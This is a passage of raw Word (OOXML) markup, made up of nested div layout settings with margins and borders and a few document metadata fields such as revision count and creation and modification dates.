        </w:div>
        <w:div w:id="798229301">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1438326947">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1345131666">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="308437047">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="3156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1225</Words>
  <Characters>6984</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Donato Maglie</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-25T14:38:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>